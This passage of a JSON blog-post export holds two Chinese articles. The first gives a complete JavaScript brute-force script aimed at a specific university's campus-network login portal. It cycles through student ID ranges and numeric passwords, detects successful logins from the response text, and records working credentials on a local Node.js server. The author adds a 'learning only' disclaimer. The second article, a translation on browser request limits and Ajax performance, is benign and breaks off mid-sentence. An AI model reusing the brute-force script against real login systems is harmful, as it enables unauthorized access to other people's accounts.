title=\"1440851411677492.png\" alt=\"blob.png\" width=\"418\" height=\"219\" style=\"width: 418px; height: 219px;\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e那么我们在尝试暴力破解密码的时候,怎么知道自己尝试的\u0026nbsp;\u003cem\u003e用户名与密码\u0026nbsp;\u003c/em\u003e是否匹配呢?\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e别急,其实这俩个返回的HTML肯定是不同的(因为一个登陆正确,一个登陆错误啊...).\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e我们要找到其中不同的地方.比如成功时,我们学校返回的HTML中有 \u003cem\u003e\u0026quot;您已经成功登录\u0026quot; 这几个字,\u003c/em\u003e那么我只要在代码中这样写:\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003eif\u0026nbsp;(backVal.indexOf(\u0026quot;您已经成功登陆\u0026quot;)\u0026nbsp;!==\u0026nbsp;-1)\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;密码匹配,\u0026nbsp;发送一个请求给本地nodejs服务器记录下来\n}\n//\u0026nbsp;\u0026nbsp;不管成功与否,继续暴力破解...\u003c/pre\u003e\u003cp style=\"line-height: 1.5em;\"\u003e所以说,表面上一个登陆界面,但却因为缺少用户认证机制,而成为一个开放的\u003cstrong\u003e\u0026quot;测试密码与用户名是否匹配\u0026quot;\u003c/strong\u003e 的服务端接口...\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e具体代码可以跳转到\u003ca href=\"https://github.com/AJLoveChina/Hacker/tree/master/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E9%99%86%E7%A0%B4%E8%A7%A3\" target=\"_blank\"\u003eGithub\u003c/a\u003e,或者核心的逻辑都在下面.\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003e//\u0026nbsp;http://bkjw.hfut.edu.cn/student/photo/2012/201221xxxx.JPG\nvar\u0026nbsp;prop\u0026nbsp;=\u0026nbsp;{};\n//\u0026nbsp;校园网登陆请求发送的url地址\nprop.url\u0026nbsp;=\u0026nbsp;\u0026quot;http://172.16.200.11/\u0026quot;;\n//\u0026nbsp;我们初始从这个学号开始\nprop.name\u0026nbsp;=\u0026nbsp;2012210000;\n//\u0026nbsp;我们初始尝试\u0026nbsp;这个123456\u0026nbsp;密码,\u0026nbsp;据统计这个密码在本校2012级5500人中,有26人使用,频率非常高.\nprop.passid\u0026nbsp;=\u0026nbsp;123456;\nprop.type\u0026nbsp;=\u0026nbsp;\u0026#39;POST\u0026#39;;\nprop.timeout\u0026nbsp;=\u0026nbsp;1000/24;\nprop.save\u0026nbsp;=\u0026nbsp;function\u0026nbsp;(str)\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;这个函数是与nodejs交互的模块,把抓取到的密码通过发送一个http请求,然后被nodejs脚本保存到文件中\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;var\u0026nbsp;url\u0026nbsp;=\u0026nbsp;\u0026quot;http://127.0.0.1:520/?\u0026quot;\u0026nbsp;+\u0026nbsp;str;\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;document.body.innerHTML\u0026nbsp;+=\u0026nbsp;\u0026quot;\u0026lt;img\u0026nbsp;src=\u0026#39;\u0026quot;\u0026nbsp;+\u0026nbsp;url\u0026nbsp;+\u0026nbsp;\u0026quot;\u0026#39;\u0026gt;\u0026quot;;\n}\nprop.tryNext\u0026nbsp;=\u0026nbsp;function\u0026nbsp;()\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;prop.name\u0026nbsp;+=\u0026nbsp;1;\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;(prop.name\u0026nbsp;\u0026gt;\u0026nbsp;2012215000)\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;prop.name\u0026nbsp;=\u0026nbsp;2012210000;\u0026nbsp;//\u0026nbsp;学号初始化\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;prop.passid\u0026nbsp;+=\u0026nbsp;1;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;密码加1,开始尝试下一个密码\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;//\u0026nbsp;请求字符串,每个学校的该参数不同,要换成你自己学校的请求字段\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;prop.str\u0026nbsp;=\u0026nbsp;\u0026quot;DDDDD=\u0026quot;\u0026nbsp;+\u0026nbsp;prop.name\u0026nbsp;+\u0026quot;\u0026amp;upass=\u0026quot;\u0026nbsp;+\u0026nbsp;prop.passid\u0026nbsp;+\u0026nbsp;\u0026quot;\u0026amp;0MKKey=%B5%C7+%C2%BC\u0026quot;;\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;prop.ajax();\n}\nprop.success\u0026nbsp;=\u0026nbsp;function\u0026nbsp;(back,\u0026nbsp;str)\u0026nbsp;{\n\tif\u0026nbsp;(prop.timeout\u0026nbsp;\u0026gt;\u0026nbsp;0)\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;setTimeout(function\u0026nbsp;()\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;(back.indexOf(\u0026#39;您已经成功登录\u0026#39;)\u0026nbsp;!==\u0026nbsp;-1)\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(\u0026quot;密码正确\u0026quot;);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;prop.save(str);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;prop.tryNext();\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;},\u0026nbsp;prop.timeout);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\u0026nbsp;else\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;(back.indexOf(\u0026#39;您已经成功登录\u0026#39;)\u0026nbsp;!==\u0026nbsp;-1)\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(\u0026quot;密码正确\u0026quot;);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;prop.save(str);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;prop.tryNext();\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n}\nprop.ajax\u0026nbsp;=\u0026nbsp;function\u0026nbsp;()\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;var\u0026nbsp;xmlhttp\u0026nbsp;=\u0026nbsp;new\u0026nbsp;XMLHttpRequest(),\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;str\u0026nbsp;=\u0026nbsp;(prop.str\u0026nbsp;+\u0026nbsp;\u0026#39;\u0026#39;).replace(\u0026#39;\u0026amp;0MKKey=%B5%C7+%C2%BC\u0026#39;,\u0026nbsp;\u0026#39;\u0026#39;);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;xmlhttp.onreadystatechange\u0026nbsp;=\u0026nbsp;function\u0026nbsp;(){\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;(xmlhttp.readyState\u0026nbsp;===\u0026nbsp;4){\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;(xmlhttp.status\u0026nbsp;\u0026gt;=\u0026nbsp;200\u0026nbsp;\u0026amp;\u0026amp;\u0026nbsp;xmlhttp.status\u0026nbsp;\u0026lt;\u0026nbsp;300)\u0026nbsp;{\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;prop.success(xmlhttp.responseText,\u0026nbsp;str);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;xmlhttp.open(prop.type,\u0026nbsp;prop.url,\u0026nbsp;true);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;xmlhttp.setRequestHeader(\u0026quot;Content-Type\u0026quot;,\u0026nbsp;\u0026quot;application/x-www-form-urlencoded;\u0026nbsp;charset=utf-8\u0026quot;)\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;xmlhttp.send(prop.str);\n}\n//\u0026nbsp;开始喽~~\nprop.tryNext();\u003c/pre\u003e",
        "createdAt": "2015-10-16T09:41:04.387Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-08-29T12:27:00.000Z"
        },
        "desc": "\u003cp style=\"line-height: 1.5em;\"\u003e好久没有写点东西了.好久不见,这一期我们让Nodejs配合前端来破解校园网密码.(注:Nodejs并不是必须的,只是用来存储密码.所以不会Nodejs也是木有关系的).当然,破解仅用于学习,我们要从中学习抵御攻击的方法,而不是要攻击他人.\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0037.gif\"/\u003e\u0026nbsp;下面是测试时的截图(测试257账号中就有4个人使用了123456这个密码,所以大家以后多注意啊不要用这么大众的密码...)\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20150829/1440846847119602.png\" title=\"1440846847119602.png\" alt=\"QQ截图20150829191257.png\"/\u003e\u003c/p\u003e\n",
        "hasContent": true,
        "is_delete": false,
        "objectId": "td0C7K8lHP",
        "stamps": "Ajax,nodejs\n",
        "title": "合工大-校园网密码破解(配合nodejs)\n",
        "types": "b1e,b2e,b13e\n",
        "updatedAt": "2015-12-05T03:28:29.406Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp\u003e\u003cspan style=\"line-height: 21px; widows: auto; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(38, 38, 38); background-color: rgb(255, 255, 255);\"\u003e如果我告诉你浏览器在同一domain下发送请求的数量有上限, 你是否会惊讶?\u003c/span\u003e\u003cimg src=\"http://localhost/Github/MyBlog/web/ueditor/themes/default/images/spacer.gif\" modifysize=\"100%\" diffpixels=\"24px\" scalingmode=\"zoom\" word_img=\"file:///C:/Users/ajax/Documents/Tencent%20Files/735267452/MyCollection/Image/C03DF098-2A76-4796-83EE-A5259A7EB95D.png\" style=\"line-height: 2em; border: 1px solid rgb(221, 221, 221); background-image: url(http://localhost/Github/MyBlog/web/ueditor/lang/zh-cn/images/localimage.png); background-attachment: initial; background-size: initial; background-origin: initial; background-clip: initial; background-position: 50% 50%; background-repeat: no-repeat;\"/\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38);\"\u003e\u003cstrong\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px;\"\u003eThe limit(这一限制)\u003c/span\u003e\u003c/strong\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(38, 38, 38);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;如果你没听说过这条规则, 请别太惊讶. 因为我看到许多开发者都忽略了这个重要的事情.\u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38);\"\u003e\u003cstrong\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px;\"\u003e那么为什么浏览器有这一限制?\u003c/span\u003e\u003c/strong\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(38, 38, 38);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;你可能要问这条限制难道不会对性能有负面影响吗? 如果浏览器给更多的连接, 我们不就有更好的上网体验了吗? \u0026nbsp; 其实浏览器这样做的原因是担心服务器过载. 在过去, 这个同domain并发请求上限普遍仅仅只有2个, 但那是web的早期, 而且是完全足够的. 因为那时候网页内容加载完成时(DomReady), 大部分内容就已经加载好了, 想想看, 图片都是稀缺资源啊!\u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(38, 38, 38);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;然而, 当css, js 变得越来越流行的时候, 这个限制很快就到了瓶颈. 因为这个原因, 我们可以看到在现在的浏览器中, 这个上限值在不断增加. 某些浏览器, 比如说Opera, 甚至允许你修改这个值, 但你最好不要设置太高, 除非你是个开发者在做测试, 否则服务器可能认为你在攻击它. (DDOS 攻击)\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38);\"\u003e\u003cstrong\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px;\"\u003e这一限制的影响\u003c/span\u003e\u003c/strong\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(38, 38, 38);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;这一限制会怎样影响你的网页呢 ? 原因很多, 除非你让用户加载一个木有图片, css 与js的静态网页, 否则所有的资源都要在\u0026quot;\u003cspan style=\"color: rgb(12, 12, 12); font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: normal;\"\u003e加载队列\u003c/span\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 1.5;\"\u003e\u0026quot;排队, 等着浏览器说 \u0026quot;hey, 你可以加载了!\u0026quot;. \u0026nbsp;如果你的网页中某些资源依赖其它资源先加载好, 那么你就会觉察到看这一限制对网页加载时间有影响.\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"line-height: 1.5; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(38, 38, 38);\"\u003e\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38);\"\u003e\u003cstrong\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 1.5;\"\u003e如何对待这一限制?\u003c/span\u003e\u003c/strong\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px;\"\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 1.5;\"\u003e\u003cbr/\u003e\u003c/span\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: normal;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;如果你把资源管理的很好, 那\u003c/span\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 1.5;\"\u003e这一限制并不会使你的网站变慢. 当你的网页第一次加载的时候, 第一个请求就是HTML文本, 当浏览器解析这个文本时, 就产生了相应的css, images与 js 请求. 当浏览器开始执行js的时候, 它还可能发送ajax请求到服务端. (译者注 : 浏览器解析css的时候还可能加载背景图, 自定义字体等资源)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(38, 38, 38);\"\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 1.5;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;幸运的是静态资源只在第一次请求时下载并缓存在浏览器中, 后续对该静态资源的请求(包括关闭网页再打开这样的操作)都会直接从缓存中获取. (译者注 : 这里, 浏览器的处理方式并不是这么简单, 浏览器还要判断资源的过期时间expires等等一系列操作来确定确实可以从缓存中获取该资源) . \u0026nbsp;如果你觉得某些资源过于零碎并且要求太多的连接请求, 那我推荐一些工具给你\u0026nbsp;\u003c/span\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: verdana, arial, helvetica, sans-serif; font-size: 12px; line-height: normal; background-color: rgb(240, 230, 213);\"\u003e(UglifyJS, Rhino, YUI Compressor, ...)\u0026nbsp;\u003c/span\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: 微软雅黑; font-size: 12px; line-height: 1.5; outline: none;\"\u003e它们可以帮你把碎片资源整合成一个文件以减少浏览器请求数目.\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38);\"\u003e\u003cem\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; text-decoration: none;\"\u003e对Ajax这一技术\u003cstrong\u003e不好的实践\u003c/strong\u003e往往也会带来很严峻的问题, 比如下面所列三条 :\u003c/span\u003e\u003c/em\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38);\"\u003e\u003cstrong\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px;\"\u003e1. 太多ajax请求\u003c/span\u003e\u003c/strong\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(38, 38, 38);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;也许你认为这个问题很简单, 那我说说几年前我接手的一个项目.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(38, 38, 38);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;这个项目遇到很大的性能问题, 有很多因素其中有一条重要的原因就是太多的ajax请求. 而且这个问题还在加剧, 因为这个项目是来自不同洲, 不同时区的团队共同完成的. 使用Ajax请求可以很好的处理我们这样的并行开发与团队编程,\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(38, 38, 38);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;但是我担心这样的现状会让ajax请求数量失去控制, 所以我决定调整一下开发的方向, 原先的设计如下图:\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cimg src=\"http://localhost/Github/MyBlog/web/ueditor/themes/default/images/spacer.gif\" modifysize=\"100%\" diffpixels=\"24px\" scalingmode=\"zoom\" style=\"background:url(http://localhost/Github/MyBlog/web/ueditor/lang/zh-cn/images/localimage.png) no-repeat center center;border:1px solid #ddd\" word_img=\"file:///C:/Users/ajax/Documents/Tencent%20Files/735267452/MyCollection/Image/AC5C2F42-58F8-4B43-B83D-1A8454D8114C.png\"/\u003e\u003cimg src=\"/ueditor/php/upload/image/20151111/1447245636106069.png\" title=\"1447245636106069.png\" alt=\"QQ图片20151111203713.png\" style=\"float: right;\"/\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(38, 38, 38);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;对于多数Ajax请求, 我们返回json格式的数据, 然后再把html与model(数据)绑定.虽然我们木有遇到嵌套请求的问题, 但由于完成一个单独的页面有太多的ajax请求并且加上浏览器的请求限制, 我们没办法使项目更快! 还有一个问题就是缺少缓存处理.\u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(38, 38, 38);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;深思熟虑后, 我们决定把减少一个页面的ajax请求数量.我们使用了异步编程(\u003cspan style=\"color: rgb(12, 12, 12); font-family: verdana, arial, helvetica, sans-serif; font-size: 12px; line-height: normal; background-color: rgb(240, 230, 213);\"\u003eAysnc Programming\u003c/span\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 1.5;\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cimg src=\"http://localhost/Github/MyBlog/web/ueditor/themes/default/images/spacer.gif\" modifysize=\"100%\" diffpixels=\"24px\" scalingmode=\"zoom\" style=\"background:url(http://localhost/Github/MyBlog/web/ueditor/lang/zh-cn/images/localimage.png) no-repeat center center;border:1px solid #ddd\" word_img=\"file:///C:/Users/ajax/Documents/Tencent%20Files/735267452/MyCollection/Image/5B0F7250-6B68-4B2D-8626-3A57970388CB.png\"/\u003e\u003cimg src=\"http://localhost/ueditor/php/upload/image/20151111/1447245689121543.png\" title=\"1447245689121543.png\" alt=\"QQ图片20151111203717.png\" style=\"line-height: 32px; white-space: normal;\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(38, 38, 38);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;每一个 promise 在一个独立的线程中执行(不是http线程), 只有所有promises都完成的时候才发送响应给浏览器. (译者注 : 这里作者使用的是服务端技术, 可以简单的理解成 : 作者在服务端加了一个中间程序处理ajax请求, 前端把需要的ajax请求写在一个请求中然后发给服务端, 服务端处理这单个请求中所有需要的服务然后返回给前端) (该优化属于服务端的范畴) (另外作者这里所说的\u0026quot;\u003cspan style=\"color: rgb(12, 12, 12); font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: normal;\"\u003e异步编程\u003c/span\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 1.5;\"\u003e\u0026quot;是指在服务端代码中使用了一些异步编程的语法, 并不是说图上的方案叫\u0026quot;异步编程\u0026quot;)\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38);\"\u003e\u003cstrong\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px;\"\u003e2. 没有很好地处理请求队列\u003c/span\u003e\u003c/strong\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(38, 38, 38);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;如果你用js发送一个ajax请求但是浏览器木有更多可用连接来处理该请求, 那么这个请求就会加入请求队列 (我叫它 \u0026quot;排队\u0026quot;). 这种情况往往发生在一个富web网页. 富web网页更像一个\u0026quot;应用\u0026quot;, 而不是传统理解的简单静态网页.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(38, 38, 38);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;假设我有一个搜索框, 用户只要改变了其中的值就发送一个ajax请求, 就叫它即时搜索好了. 如果用户改变过于频繁, 那么js就会短时间发送大量的ajax请求.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38);\"\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;解决方法很简单. A. 忘了什么富web网页吧, 老老实实用刷新页面的方式呈现给用户 \u0026nbsp;B.设置请求间隔, 或者在上一个请求完成后再发送另一个请求.\u0026nbsp;\u003c/span\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 2em;\"\u003e\u0026nbsp;(译者注 : 推荐使用B. 类似的还有点击button提交表单, 当用户点击提交按钮后, 事件A触发, 在A完成之前, 我们应该阻止A的再次触发, 可以给button变为灰色, 并且提示用户表单正在提交中, 这些都是很好的用户体验与编程实践)\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38);\"\u003e\u003cstrong\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px;\"\u003e3. 嵌套的ajax请求\u003c/span\u003e\u003c/strong\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px; color: rgb(38, 38, 38);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;什么是嵌套的ajax 